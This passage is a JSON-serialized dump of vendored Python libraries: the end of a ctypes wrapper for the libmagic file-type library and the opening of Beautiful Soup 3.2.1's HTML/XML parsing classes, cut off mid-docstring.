1.2'\n>>> magic.from_file(\"testdata/test.pdf\", mime=True)\n'application/pdf'\n>>> magic.from_buffer(open(\"testdata/test.pdf\").read(1024))\n'PDF document, version 1.2'\n>>>\n\n\"\"\"\n\nimport sys\nimport os.path\n\nclass MagicException(Exception):\n    pass\n\nclass Magic:\n    \"\"\"\n    Magic is a wrapper around the libmagic C library.\n    \"\"\"\n\n    def __init__(self, mime=False, magic_file=None, mime_encoding=False):\n        \"\"\"\n        Create a new libmagic wrapper.\n\n        mime - if True, mimetypes are returned instead of textual descriptions\n        mime_encoding - if True, codec is returned\n        magic_file - use a mime database other than the system default\n        \"\"\"\n\n        flags = MAGIC_NONE\n        if mime:\n            flags |= MAGIC_MIME\n        elif mime_encoding:\n            flags |= MAGIC_MIME_ENCODING\n\n        self.cookie = magic_open(flags)\n\n        magic_load(self.cookie, magic_file)\n\n\n    def from_buffer(self, buf):\n        \"\"\"\n        Identify the contents of `buf`\n        \"\"\"\n\n        return magic_buffer(self.cookie, buf)\n\n    def from_file(self, filename):\n        \"\"\"\n        Identify the contents of file `filename`\n        raises IOError if the file does not exist\n        \"\"\"\n\n        if not os.path.exists(filename):\n            raise IOError(\"File does not exist: \" + filename)\n\n        return magic_file(self.cookie, filename)\n\n    def __del__(self):\n        # during shutdown magic_close may have been cleared already\n        if self.cookie and magic_close:\n            magic_close(self.cookie)\n            self.cookie = None\n\n_magic_mime = None\n_magic = None\n\ndef _get_magic_mime():\n    global _magic_mime\n    if not _magic_mime:\n        _magic_mime = Magic(mime=True)\n    return _magic_mime\n\ndef _get_magic():\n    global _magic\n    if not _magic:\n        _magic = Magic()\n    return _magic\n\ndef _get_magic_type(mime):\n    if mime:\n        return _get_magic_mime()\n    else:\n        return _get_magic()\n\ndef from_file(filename, mime=False):\n    m = _get_magic_type(mime)\n    return m.from_file(filename)\n\ndef from_buffer(buffer, mime=False):\n    m = _get_magic_type(mime)\n    return m.from_buffer(buffer)\n\ntry:\n    libmagic = None\n\n    import ctypes\n    import ctypes.util\n\n    from ctypes import c_char_p, c_int, c_size_t, c_void_p\n\n    # Let's try to find magic or magic1\n    dll = ctypes.util.find_library('magic') or ctypes.util.find_library('magic1')\n\n    # This is necessary because find_library returns None if it doesn't find the library\n    if dll:\n        try:\n            libmagic = ctypes.CDLL(dll)\n        except WindowsError:\n            pass\n\n    if not libmagic or not libmagic._name:\n        platform_to_lib = {'darwin': ['/opt/local/lib/libmagic.dylib',\n                                      '/usr/local/lib/libmagic.dylib',\n                                      '/usr/local/Cellar/libmagic/5.10/lib/libmagic.dylib'],\n                           'win32':  ['magic1.dll']}\n        for dll in platform_to_lib.get(sys.platform, []):\n            try:\n                libmagic = ctypes.CDLL(dll)\n            except OSError:\n                pass\n\n    if not libmagic or not libmagic._name:\n        # It is better to raise an ImportError since we are importing magic module\n        raise ImportError('failed to find libmagic.  Check your installation')\n\n    magic_t = ctypes.c_void_p\n\n    def errorcheck(result, func, args):\n        err = magic_error(args[0])\n        if err is not None:\n            raise MagicException(err)\n        else:\n            return result\n\n    def coerce_filename(filename):\n        if filename is None:\n            return None\n        return filename.encode(sys.getfilesystemencoding())\n\n    magic_open = libmagic.magic_open\n    magic_open.restype = magic_t\n    magic_open.argtypes = [c_int]\n\n    magic_close = libmagic.magic_close\n    magic_close.restype = None\n    magic_close.argtypes = [magic_t]\n\n    magic_error = libmagic.magic_error\n    magic_error.restype = c_char_p\n    magic_error.argtypes = [magic_t]\n\n    magic_errno = libmagic.magic_errno\n    magic_errno.restype = c_int\n    magic_errno.argtypes = [magic_t]\n\n    _magic_file = libmagic.magic_file\n    _magic_file.restype = c_char_p\n    _magic_file.argtypes = [magic_t, c_char_p]\n    _magic_file.errcheck = errorcheck\n\n    def magic_file(cookie, filename):\n        return _magic_file(cookie, coerce_filename(filename))\n\n    _magic_buffer = libmagic.magic_buffer\n    _magic_buffer.restype = c_char_p\n    _magic_buffer.argtypes = [magic_t, c_void_p, c_size_t]\n    _magic_buffer.errcheck = errorcheck\n\n\n    def magic_buffer(cookie, buf):\n        return _magic_buffer(cookie, buf, len(buf))\n\n    _magic_load = libmagic.magic_load\n    _magic_load.restype = c_int\n    _magic_load.argtypes = [magic_t, c_char_p]\n    _magic_load.errcheck = errorcheck\n\n    def magic_load(cookie, filename):\n        return _magic_load(cookie, coerce_filename(filename))\n\n    magic_setflags = libmagic.magic_setflags\n    magic_setflags.restype = c_int\n    magic_setflags.argtypes = [magic_t, c_int]\n\n    magic_check = libmagic.magic_check\n    magic_check.restype = c_int\n    magic_check.argtypes = [magic_t, c_char_p]\n\n    magic_compile = libmagic.magic_compile\n    magic_compile.restype = c_int\n    magic_compile.argtypes = [magic_t, c_char_p]\n\nexcept (ImportError, OSError):\n    from_file = from_buffer = lambda *args, **kwargs: MAGIC_UNKNOWN_FILETYPE\n\nMAGIC_NONE = 0x000000 # No flags\nMAGIC_DEBUG = 0x000001 # Turn on debugging\nMAGIC_SYMLINK = 0x000002 # Follow symlinks\nMAGIC_COMPRESS = 0x000004 # Check inside compressed files\nMAGIC_DEVICES = 0x000008 # Look at the contents of devices\nMAGIC_MIME = 0x000010 # Return a mime string\nMAGIC_MIME_ENCODING = 0x000400 # Return the MIME encoding\nMAGIC_CONTINUE = 0x000020 # Return all matches\nMAGIC_CHECK = 0x000040 # Print warnings to stderr\nMAGIC_PRESERVE_ATIME = 0x000080 # Restore access time on exit\nMAGIC_RAW = 0x000100 # Don't translate unprintable chars\nMAGIC_ERROR = 0x000200 # Handle ENOENT etc as real errors\nMAGIC_NO_CHECK_COMPRESS = 0x001000 # Don't check for compressed files\nMAGIC_NO_CHECK_TAR = 0x002000 # Don't check for tar files\nMAGIC_NO_CHECK_SOFT = 0x004000 # Don't check magic entries\nMAGIC_NO_CHECK_APPTYPE = 0x008000 # Don't check application type\nMAGIC_NO_CHECK_ELF = 0x010000 # Don't check for elf details\nMAGIC_NO_CHECK_ASCII = 0x020000 # Don't check for ascii files\nMAGIC_NO_CHECK_TROFF = 0x040000 # Don't check ascii/troff\nMAGIC_NO_CHECK_FORTRAN = 0x080000 # Don't check ascii/fortran\nMAGIC_NO_CHECK_TOKENS = 0x100000 # Don't check ascii/tokens\nMAGIC_UNKNOWN_FILETYPE = b\"unknown\"\n", "thirdparty/magic/__init__.py": "", "thirdparty/beautifulsoup/__init__.py": "#!/usr/bin/env python2\n# \n# Copyright (c) 2004-2010, Leonard Richardson\n# \n# All rights reserved.\n# \n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are\n# met:\n# \n#   * Redistributions of source code must retain the above copyright\n#     notice, this list of conditions and the following disclaimer.\n# \n#   * Redistributions in binary form must reproduce the above\n#     copyright notice, this list of conditions and the following\n#     disclaimer in the documentation and/or other materials provided\n#     with the distribution.\n# \n#   * Neither the name of the Beautiful Soup Consortium and All\n#     Night Kosher Bakery nor the names of its contributors may be\n#     used to endorse or promote products derived from this software\n#     without specific prior written permission.\n# \n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n# \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n# A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR\n# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n# LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n# NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE, DAMMIT.\n# \n\npass\n", "thirdparty/beautifulsoup/beautifulsoup.py": "\"\"\"Beautiful Soup\nElixir and Tonic\n\"The Screen-Scraper's Friend\"\nhttp://www.crummy.com/software/BeautifulSoup/\n\nBeautiful Soup parses a (possibly invalid) XML or HTML document into a\ntree representation. It provides methods and Pythonic idioms that make\nit easy to navigate, search, and modify the tree.\n\nA well-formed XML/HTML document yields a well-formed data\nstructure. An ill-formed XML/HTML document yields a correspondingly\nill-formed data structure. If your document is only locally\nwell-formed, you can use this library to find and process the\nwell-formed part of it.\n\nBeautiful Soup works with Python 2.2 and up. It has no external\ndependencies, but you'll have more success at converting data to UTF-8\nif you also install these three packages:\n\n* chardet, for auto-detecting character encodings\n  http://chardet.feedparser.org/\n* cjkcodecs and iconv_codec, which add more encodings to the ones supported\n  by stock Python.\n  http://cjkpython.i18n.org/\n\nBeautiful Soup defines classes for two main parsing strategies:\n\n * BeautifulStoneSoup, for parsing XML, SGML, or your domain-specific\n   language that kind of looks like XML.\n\n * BeautifulSoup, for parsing run-of-the-mill HTML code, be it valid\n   or invalid. This class has web browser-like heuristics for\n   obtaining a sensible parse tree in the face of common HTML errors.\n\nBeautiful Soup also defines a class (UnicodeDammit) for autodetecting\nthe encoding of an HTML or XML document, and converting it to\nUnicode. Much of this code is taken from Mark Pilgrim's Universal Feed Parser.\n\nFor more than you ever wanted to know about Beautiful Soup, see the\ndocumentation:\nhttp://www.crummy.com/software/BeautifulSoup/documentation.html\n\nHere, have some legalese:\n\nCopyright (c) 2004-2010, Leonard Richardson\n\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are\nmet:\n\n  * Redistributions of source code must retain the above copyright\n    notice, this list of conditions and the following disclaimer.\n\n  * Redistributions in binary form must reproduce the above\n    copyright notice, this list of conditions and the following\n    disclaimer in the documentation and/or other materials provided\n    with the distribution.\n\n  * Neither the name of the Beautiful Soup Consortium and All\n    Night Kosher Bakery nor the names of its contributors may be\n    used to endorse or promote products derived from this software\n    without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n\"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR\nCONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\nEXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\nPROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\nPROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\nLIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\nNEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\nSOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE, DAMMIT.\n\n\"\"\"\nfrom __future__ import generators\nfrom __future__ import print_function\n\n__author__ = \"Leonard Richardson (leonardr@segfault.org)\"\n__version__ = \"3.2.1\"\n__copyright__ = \"Copyright (c) 2004-2012 Leonard Richardson\"\n__license__ = \"New-style BSD\"\n\nimport codecs\nimport re\nimport sys\n\nif sys.version_info >= (3, 0):\n    xrange = range\n    text_type = str\n    binary_type = bytes\n    basestring = str\nelse:\n    text_type = unicode\n    binary_type = str\n\ntry:\n  from htmlentitydefs import name2codepoint\nexcept ImportError:\n  name2codepoint = {}\ntry:\n    set\nexcept NameError:\n    from sets import Set as set\n\ntry:\n    import sgmllib\nexcept ImportError:\n    from lib.utils import sgmllib\n\ntry:\n    import markupbase\nexcept ImportError:\n    import _markupbase as markupbase\n\n#These hacks make Beautiful Soup able to parse XML with namespaces\nsgmllib.tagfind = re.compile('[a-zA-Z][-_.:a-zA-Z0-9]*')\nmarkupbase._declname_match = re.compile(r'[a-zA-Z][-_.:a-zA-Z0-9]*\\s*').match\n\nDEFAULT_OUTPUT_ENCODING = \"utf-8\"\n\ndef _match_css_class(str):\n    \"\"\"Build a RE to match the given CSS class.\"\"\"\n    return re.compile(r\"(^|.*\\s)%s($|\\s)\" % str)\n\n# First, the classes that represent markup elements.\n\nclass PageElement(object):\n    \"\"\"Contains the navigational information for some part of the page\n    (either a tag or a piece of text)\"\"\"\n\n    def _invert(h):\n        \"Cheap function to invert a hash.\"\n        i = {}\n        for k,v in h.items():\n            i[v] = k\n        return i\n\n    XML_ENTITIES_TO_SPECIAL_CHARS = { \"apos\" : \"'\",\n                                      \"quot\" : '\"',\n                                      \"amp\" : \"&\",\n                                      \"lt\" : \"<\",\n                                      \"gt\" : \">\" }\n\n    XML_SPECIAL_CHARS_TO_ENTITIES = _invert(XML_ENTITIES_TO_SPECIAL_CHARS)\n\n    def setup(self, parent=None, previous=None):\n        \"\"\"Sets up the initial relations between this element and\n        other elements.\"\"\"\n        self.parent = parent\n        self.previous = previous\n        self.next = None\n        self.previousSibling = None\n        self.nextSibling = None\n        if self.parent and self.parent.contents:\n            self.previousSibling = self.parent.contents[-1]\n            self.previousSibling.nextSibling = self\n\n    def replaceWith(self, replaceWith):\n        oldParent = self.parent\n        myIndex = self.parent.index(self)\n        if hasattr(replaceWith, \"parent\")\\\n                  and replaceWith.parent is self.parent:\n            # We're replacing this element with one of its siblings.\n            index = replaceWith.parent.index(replaceWith)\n            if index and index < myIndex:\n                # Furthermore, it comes before this element. That\n                # means that when we extract it, the index of this\n                # element will change.\n                myIndex = myIndex - 1\n        self.extract()\n        oldParent.insert(myIndex, replaceWith)\n\n    def replaceWithChildren(self):\n        myParent = self.parent\n        myIndex = self.parent.index(self)\n        self.extract()\n        reversedChildren = list(self.contents)\n        reversedChildren.reverse()\n        for child in reversedChildren:\n            myParent.insert(myIndex, child)\n\n    def extract(self):\n        \"\"\"Destructively rips this element out of the tree.\"\"\"\n        if self.parent:\n            try:\n                del self.parent.contents[self.parent.index(self)]\n            except ValueError:\n                pass\n\n        #Find the two elements that would be next to each other if\n        #this element (and any children) hadn't been parsed. Connect\n        #the two.\n        lastChild = self._lastRecursiveChild()\n        nextElement = lastChild.next\n\n        if self.previous:\n            self.previous.next = nextElement\n        if nextElement:\n            nextElement.previous = self.previous\n        self.previous = None\n        lastChild.next = None\n\n        self.parent = None\n        if self.previousSibling:\n            self.previousSibling.nextSibling = self.nextSibling\n        if self.nextSibling:\n            self.nextSibling.previousSibling = self.previousSibling\n        self.previousSibling = self.nextSibling = None\n        return self\n\n    def _lastRecursiveChild(self):\n        \"Finds the last element beneath this object to be parsed.\"\n        lastChild = self\n        while hasattr(lastChild, 'contents') and lastChild.contents:\n            lastChild = lastChild.contents[-1]\n        return lastChild\n\n    def insert(self, position, newChild):\n        if isinstance(newChild, basestring) \\\n            and not isinstance(newChild, NavigableString):\n            newChild = NavigableString(newChild)\n\n        position =  min(position, len(self.contents))\n        if hasattr(newChild, 'parent') and newChild.parent is not None:\n            # We're 'inserting' an element that's already one\n            # of this object's children.\n            if newChild.parent is self:\n                index = self.index(newChild)\n                if index > position:\n                    # Furthermore we're moving it further down the\n                    # list of this object's children. That means that\n                    # when we extract this element, our target index\n                    # will jump down one.\n                    position = position - 1\n            newChild.extract()\n\n        newChild.parent = self\n        previousChild = None\n        if position == 0:\n            newChild.previousSibling = None\n            newChild.previous = self\n        else:\n            previousChild = self.contents[position-1]\n            newChild.previousSibling = previousChild\n            newChild.previousSibling.nextSibling = newChild\n            newChild.previous = previousChild._lastRecursiveChild()\n        if newChild.previous:\n            newChild.previous.next = newChild\n\n        newChildsLastElement = newChild._lastRecursiveChild()\n\n        if position >= len(self.contents):\n            newChild.nextSibling = None\n\n            parent = self\n            parentsNextSibling = None\n            while not parentsNextSibling:\n                parentsNextSibling = parent.nextSibling\n                parent = parent.parent\n                if not parent: # This is the last element in the document.\n                    break\n            if parentsNextSibling:\n                newChildsLastElement.next = parentsNextSibling\n            else:\n                newChildsLastElement.next = None\n        else:\n            nextChild = self.contents[position]\n            newChild.nextSibling = nextChild\n            if newChild.nextSibling:\n                newChild.nextSibling.previousSibling = newChild\n            newChildsLastElement.next = nextChild\n\n        if newChildsLastElement.next:\n            newChildsLastElement.next.previous = newChildsLastElement\n        self.contents.insert(position, newChild)\n\n    def append(self, tag):\n        \"\"\"Appends the given tag to the contents of this tag.\"\"\"\n        self.insert(len(self.contents), tag)\n\n    def findNext(self, name=None, attrs={}, text=None, **kwargs):\n        \"\"\"Returns the first item that matches the given criteria and\n        appears after this Tag in the document.\"\"\"\n        return self._findOne(self.findAllNext, name, attrs, text, **kwargs)\n\n    def findAllNext(self, name=None, attrs={}, text=None, limit=None,\n                    **kwargs):\n        \"\"\"Returns all items that match the given criteria and appear\n        after this Tag in the document.\"\"\"\n        return self._findAll(name, attrs, text, limit, self.nextGenerator,\n                             **kwargs)\n\n    def findNextSibling(self, name=None, attrs={}, text=None, **kwargs):\n        \"\"\"Returns the closest sibling to this Tag that matches the\n        given criteria and appears after this Tag in the document.\"\"\"\n        return self._findOne(self.findNextSiblings, name, attrs, text,\n                             **kwargs)\n\n    def findNextSiblings(self, name=None, attrs={}, text=None, limit=None,\n                         **kwargs):\n        \"\"\"Returns the siblings of this Tag that match the given\n        criteria and appear after this Tag in the document.\"\"\"\n        return self._findAll(name, attrs, text, limit,\n                             self.nextSiblingGenerator, **kwargs)\n    fetchNextSiblings = findNextSiblings # Compatibility with pre-3.x\n\n    def findPrevious(self, name=None, attrs={}, text=None, **kwargs):\n        \"\"\"Returns the first item that matches the given criteria and\n        appears before this Tag in the document.\"\"\"\n        return self._findOne(self.findAllPrevious, name, attrs, text, **kwargs)\n\n    def findAllPrevious(self, name=None, attrs={}, text=None, limit=None,\n                        **kwargs):\n        \"\"\"Returns all items that match the given criteria and appear\n        before this Tag in the document.\"\"\"\n        return self._findAll(name, attrs, text, limit, self.previousGenerator,\n                           **kwargs)\n    fetchPrevious = findAllPrevious # Compatibility with pre-3.x\n\n    def findPreviousSibling(self, name=None, attrs={}, text=None, **kwargs):\n        \"\"\"Returns the closest sibling to this Tag that matches the\n        given criteria and appears before this Tag in the document.\"\"\"\n        return self._findOne(self.findPreviousSiblings, name, attrs, text,\n                             **kwargs)\n\n    def findPreviousSiblings(self, name=None, attrs={}, text=None,\n                             limit=None, **kwargs):\n        \"\"\"Returns the siblings of this Tag that match the given\n        criteria and appear before this Tag in the document.\"\"\"\n        return self._findAll(name, attrs, text, limit,\n                             self.previousSiblingGenerator, **kwargs)\n    fetchPreviousSiblings = findPreviousSiblings # Compatibility with pre-3.x\n\n    def findParent(self, name=None, attrs={}, **kwargs):\n        \"\"\"Returns the closest parent of this Tag that matches the given\n        criteria.\"\"\"\n        # NOTE: We can't use _findOne because findParents takes a different\n        # set of arguments.\n        r = None\n        l = self.findParents(name, attrs, 1)\n        if l:\n            r = l[0]\n        return r\n\n    def findParents(self, name=None, attrs={}, limit=None, **kwargs):\n        \"\"\"Returns the parents of this Tag that match the given\n        criteria.\"\"\"\n\n        return self._findAll(name, attrs, None, limit, self.parentGenerator,\n                             **kwargs)\n    fetchParents = findParents # Compatibility with pre-3.x\n\n    #These methods do the real heavy lifting.\n\n    def _findOne(self, method, name, attrs, text, **kwargs):\n        r = None\n        l = method(name, attrs, text, 1, **kwargs)\n        if l:\n            r = l[0]\n        return r\n\n    def _findAll(self, name, attrs, text, limit, generator, **kwargs):\n        \"Iterates over a generator looking for things that match.\"\n\n        if isinstance(name, SoupStrainer):\n            strainer = name\n        # (Possibly) special case some findAll*(...) searches\n        elif text is None and not limit and not attrs and not kwargs:\n            # findAll*(True)\n            if name is True:\n                return [element for element in generator()\n                        if isinstance(element, Tag)]\n            # findAll*('tag-name')\n            elif isinstance(name, basestring):\n                return [element for element in generator()\n                        if isinstance(element, Tag) and\n                        element.name == name]\n            else:\n                strainer = SoupStrainer(name, attrs, text, **kwargs)\n        # Build a SoupStrainer\n        else:\n            strainer = SoupStrainer(name, attrs, text, **kwargs)\n        results = ResultSet(strainer)\n        g = generator()\n        while True:\n            try:\n                i = next(g)\n            except StopIteration:\n                break\n            if i:\n                found = strainer.search(i)\n                if found:\n                    results.append(found)\n                    if limit and len(results) >= limit:\n                        break\n        return results\n\n    #These Generators can be used to navigate starting from both\n    #NavigableStrings and Tags.\n    def nextGenerator(self):\n        i = self\n        while i is not None:\n            i = i.next\n            yield i\n\n    def nextSiblingGenerator(self):\n        i = self\n        while i is not None:\n            i = i.nextSibling\n            yield i\n\n    def previousGenerator(self):\n        i = self\n        while i is not None:\n            i = i.previous\n            yield i\n\n    def previousSiblingGenerator(self):\n        i = self\n        while i is not None:\n            i = i.previousSibling\n            yield i\n\n    def parentGenerator(self):\n        i = self\n        while i is not None:\n            i = i.parent\n            yield i\n\n    # Utility methods\n    def substituteEncoding(self, str, encoding=None):\n        encoding = encoding or \"utf-8\"\n        return str.replace(\"%SOUP-ENCODING%\", encoding)\n\n    def toEncoding(self, s, encoding=None):\n        \"\"\"Encodes an object to a string in some encoding, or to Unicode.\n        .\"\"\"\n        if isinstance(s, text_type):\n            if encoding:\n                s = s.encode(encoding)\n        elif isinstance(s, binary_type):\n            s = s.encode(encoding or \"utf8\")\n        else:\n            s  = self.toEncoding(str(s), encoding or \"utf8\")\n        return s\n\n    BARE_AMPERSAND_OR_BRACKET = re.compile(r\"([<>]|&(?!#\\d+;|#x[0-9a-fA-F]+;|\\w+;))\")\n\n    def _sub_entity(self, x):\n        \"\"\"Used with a regular expression to substitute the\n        appropriate XML entity for an XML special character.\"\"\"\n        return \"&\" + self.XML_SPECIAL_CHARS_TO_ENTITIES[x.group(0)[0]] + \";\"\n\n\nclass NavigableString(text_type, PageElement):\n\n    def __new__(cls, value):\n        \"\"\"Create a new NavigableString.\n\n        When unpickling a NavigableString, this method is called with\n        the string in DEFAULT_OUTPUT_ENCODING. That encoding needs to be\n        passed in to the superclass's __new__ or the superclass won't know\n        how to handle non-ASCII characters.\n        \"\"\"\n        if isinstance(value, text_type):\n            return text_type.__new__(cls, value)\n        return text_type.__new__(cls, value, DEFAULT_OUTPUT_ENCODING)\n\n    def __getnewargs__(self):\n        return (NavigableString.__str__(self),)\n\n    def __getattr__(self, attr):\n        \"\"\"text.string gives you text. This is for backwards\n        compatibility for Navigable*String, but for CData* it lets you\n        get the string without the CData wrapper.\"\"\"\n        if attr == 'string':\n            return self\n        else:\n            raise AttributeError(\"'%s' object has no attribute '%s'\" % (self.__class__.__name__, attr))\n\n    def __unicode__(self):\n        return str(self).decode(DEFAULT_OUTPUT_ENCODING)\n\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        # Substitute outgoing XML entities.\n        data = self.BARE_AMPERSAND_OR_BRACKET.sub(self._sub_entity, self)\n        if encoding:\n            return data.encode(encoding)\n        else:\n            return data\n\nclass CData(NavigableString):\n\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        return \"<![CDATA[%s]]>\" % NavigableString.__str__(self, encoding)\n\nclass ProcessingInstruction(NavigableString):\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        output = self\n        if \"%SOUP-ENCODING%\" in output:\n            output = self.substituteEncoding(output, encoding)\n        return \"<?%s?>\" % self.toEncoding(output, encoding)\n\nclass Comment(NavigableString):\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        return \"<!--%s-->\" % NavigableString.__str__(self, encoding)\n\nclass Declaration(NavigableString):\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        return \"<!%s>\" % NavigableString.__str__(self, encoding)\n\nclass Tag(PageElement):\n\n    \"\"\"Represents a found HTML tag with its attributes and contents.\"\"\"\n\n    def _convertEntities(self, match):\n        \"\"\"Used in a call to re.sub to replace HTML, XML, and numeric\n        entities with the appropriate Unicode characters. If HTML\n        entities are being converted, any unrecognized entities are\n        escaped.\"\"\"\n        try:\n            x = match.group(1)\n            if self.convertHTMLEntities and x in name2codepoint:\n                return unichr(name2codepoint[x])\n            elif x in self.XML_ENTITIES_TO_SPECIAL_CHARS:\n                if self.convertXMLEntities:\n                    return self.XML_ENTITIES_TO_SPECIAL_CHARS[x]\n                else:\n                    return u'&%s;' % x\n            elif len(x) > 0 and x[0] == '#':\n                # Handle numeric entities\n                if len(x) > 1 and x[1] == 'x':\n                    return unichr(int(x[2:], 16))\n                else:\n                    return unichr(int(x[1:]))\n\n            elif self.escapeUnrecognizedEntities:\n                return u'&amp;%s;' % x\n\n        except ValueError:  # e.g. ValueError: unichr() arg not in range(0x10000)\n            pass\n\n        return u'&%s;' % x\n\n    def __init__(self, parser, name, attrs=None, parent=None,\n                 previous=None):\n        \"Basic constructor.\"\n\n        # We don't actually store the parser object: that lets extracted\n        # chunks be garbage-collected\n        self.parserClass = parser.__class__\n        self.isSelfClosing = parser.isSelfClosingTag(name)\n        self.name = name\n        if attrs is None:\n            attrs = []\n        elif isinstance(attrs, dict):\n            attrs = attrs.items()\n        self.attrs = attrs\n        self.contents = []\n        self.setup(parent, previous)\n        self.hidden = False\n        self.containsSubstitutions = False\n        self.convertHTMLEntities = parser.convertHTMLEntities\n        self.convertXMLEntities = parser.convertXMLEntities\n        self.escapeUnrecognizedEntities = parser.escapeUnrecognizedEntities\n\n        # Convert any HTML, XML, or numeric entities in the attribute values.\n        # Reference: https://github.com/pkrumins/xgoogle/pull/16/commits/3dba1165c436b0d6e5bdbd09e53ca0dbf8a043f8\n        convert = lambda k_val: (k_val[0],\n                                 re.sub(r\"&(#\\d+|#x[0-9a-fA-F]+|\\w+);\",\n                                     self._convertEntities,\n                                     k_val[1]))\n        self.attrs = map(convert, self.attrs)\n\n    def getString(self):\n        if (len(self.contents) == 1\n            and isinstance(self.contents[0], NavigableString)):\n            return self.contents[0]\n\n    def setString(self, string):\n        \"\"\"Replace the contents of the tag with a string\"\"\"\n        self.clear()\n        self.append(string)\n\n    string = property(getString, setString)\n\n    def getText(self, separator=u\"\"):\n        if not len(self.contents):\n            return u\"\"\n        stopNode = self._lastRecursiveChild().next\n        strings = []\n        current = self.contents[0]\n        while current and current is not stopNode:\n            if isinstance(current, NavigableString):\n                strings.append(current.strip())\n            current = current.next\n        return separator.join(strings)\n\n    text = property(getText)\n\n    def get(self, key, default=None):\n        \"\"\"Returns the value of the 'key' attribute for the tag, or\n        the value given for 'default' if it doesn't have that\n        attribute.\"\"\"\n        return self._getAttrMap().get(key, default)\n\n    def clear(self):\n        \"\"\"Extract all children.\"\"\"\n        for child in self.contents[:]:\n            child.extract()\n\n    def index(self, element):\n        for i, child in enumerate(self.contents):\n            if child is element:\n                return i\n        raise ValueError(\"Tag.index: element not in tag\")\n\n    def has_key(self, key):\n        return self._getAttrMap().has_key(key)\n\n    def __getitem__(self, key):\n        \"\"\"tag[key] returns the value of the 'key' attribute for the tag,\n        and throws an exception if it's not there.\"\"\"\n        return self._getAttrMap()[key]\n\n    def __iter__(self):\n        \"Iterating over a tag iterates over its contents.\"\n        return iter(self.contents)\n\n    def __len__(self):\n        \"The length of a tag is the length of its list of contents.\"\n        return len(self.contents)\n\n    def __contains__(self, x):\n        return x in self.contents\n\n    def __nonzero__(self):\n        \"A tag is non-None even if it has no contents.\"\n        return True\n\n    def __setitem__(self, key, value):\n        \"\"\"Setting tag[key] sets the value of the 'key' attribute for the\n        tag.\"\"\"\n        self._getAttrMap()\n        self.attrMap[key] = value\n        found = False\n        for i in xrange(0, len(self.attrs)):\n            if self.attrs[i][0] == key:\n                self.attrs[i] = (key, value)\n                found = True\n        if not found:\n            self.attrs.append((key, value))\n        self._getAttrMap()[key] = value\n\n    def __delitem__(self, key):\n        \"Deleting tag[key] deletes all 'key' attributes for the tag.\"\n        for item in self.attrs:\n            if item[0] == key:\n                self.attrs.remove(item)\n                #We don't break because bad HTML can define the same\n                #attribute multiple times.\n            self._getAttrMap()\n            if self.attrMap.has_key(key):\n                del self.attrMap[key]\n\n    def __call__(self, *args, **kwargs):\n        \"\"\"Calling a tag like a function is the same as calling its\n        findAll() method. Eg. tag('a') returns a list of all the A tags\n        found within this tag.\"\"\"\n        return self.findAll(*args, **kwargs)\n\n    def __getattr__(self, tag):\n        #print \"Getattr %s.%s\" % (self.__class__, tag)\n        if len(tag) > 3 and tag.rfind('Tag') == len(tag)-3:\n            return self.find(tag[:-3])\n        elif tag.find('__') != 0:\n            return self.find(tag)\n        raise AttributeError(\"'%s' object has no attribute '%s'\" % (self.__class__, tag))\n\n    def __eq__(self, other):\n        \"\"\"Returns true iff this tag has the same name, the same attributes,\n        and the same contents (recursively) as the given tag.\n\n        NOTE: right now this will return false if two tags have the\n        same attributes in a different order. Should this be fixed?\"\"\"\n        if other is self:\n            return True\n        if not hasattr(other, 'name') or not hasattr(other, 'attrs') or not hasattr(other, 'contents') or self.name != other.name or self.attrs != other.attrs or len(self) != len(other):\n            return False\n        for i in xrange(0, len(self.contents)):\n            if self.contents[i] != other.contents[i]:\n                return False\n        return True\n\n    def __ne__(self, other):\n        \"\"\"Returns true iff this tag is not identical to the other tag,\n        as defined in __eq__.\"\"\"\n        return not self == other\n\n    def __repr__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        \"\"\"Renders this tag as a string.\"\"\"\n        return self.__str__(encoding)\n\n    def __unicode__(self):\n        return self.__str__(None)\n\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING,\n                prettyPrint=False, indentLevel=0):\n        \"\"\"Returns a string or Unicode representation 